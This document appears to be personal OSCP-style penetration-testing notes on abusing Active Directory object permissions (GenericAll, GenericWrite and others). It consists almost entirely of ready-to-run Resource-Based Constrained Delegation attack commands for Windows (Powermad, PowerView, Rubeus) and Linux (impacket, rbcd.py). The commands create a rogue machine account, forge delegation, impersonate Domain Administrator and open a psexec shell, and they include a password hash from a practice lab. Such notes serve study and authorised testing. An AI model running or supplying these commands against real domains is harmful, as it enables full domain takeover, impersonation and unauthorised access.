# Important Permissions
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group


# GENERICALL ON A MACHINE:: Resource Based Constrained Delegation
WUT IS DIS?:
TL;DR
If we have GenericALL/GenericWrite privileges on a machine account object of a domain, we can abuse it and impersonate ourselves as any user of the domain to it. 
For example we can impersonate Domain Administrator and have complete access.

## Exploit on Windows

Tools we are going to use:
PowerView.ps1
Powermad.ps1
Rubeus.exe

```bash
#Import Powermad and use it to create a new MACHINE ACCOUNT
. .\Powermad.ps1
New-MachineAccount -MachineAccount <MachineAccountName> -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose

#Import PowerView and get the SID of our new created machine account
. .\PowerView.ps1
$ComputerSid = Get-DomainComputer <MachineAccountName> -Properties objectsid | Select -Expand objectsid

#Then by using the SID we are going to build an ACE for the new created machine account using a raw security descriptor:
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

#Next, we need to set the security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView
Get-DomainComputer TargetMachine | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

#After that we need to get the RC4 hash of the new machine account's password using Rubeus
Rubeus.exe hash /password:'p@ssword!'

#And for this example, we are going to impersonate Domain Administrator on the cifs service of the target computer using Rubeus
Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:Administrator /msdsspn:cifs/TargetMachine.wtver.domain /domain:wtver.domain /ptt

#Finally we can access the C$ drive of the target machine
dir \\TargetMachine.wtver.domain\C$
```

This won't work locally so first copy and paste base64 on kali linux 

![image](https://github.com/nuricheun/OSCP/assets/14031269/558fc1b8-7a19-4b01-bbfc-5da6f262a60c)

```bash
# I just copied and pasted base64 into a file named base
mousepad base
# Decoded it and save it as ticket.kirbi                                                                                                                                                              
cat base | base64 -d > ticket.kirbi
# Convert it to ccache
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache  
psexec.py -k -no-pass resourced.local/administrator@resourcedc.resourced.local -dc-ip 192.168.201.175
```

## Exploit on Linux

Tools we are going to use:
impacket-addcomputer
rbcd.py
impacket-getST
impacket-psexec

```bash
impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.x.x -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
python3 rbcd.py -dc-ip 192.168.x.x -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.x.x
export KRB5CCNAME=./Administrator.ccache
impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.x.x
```

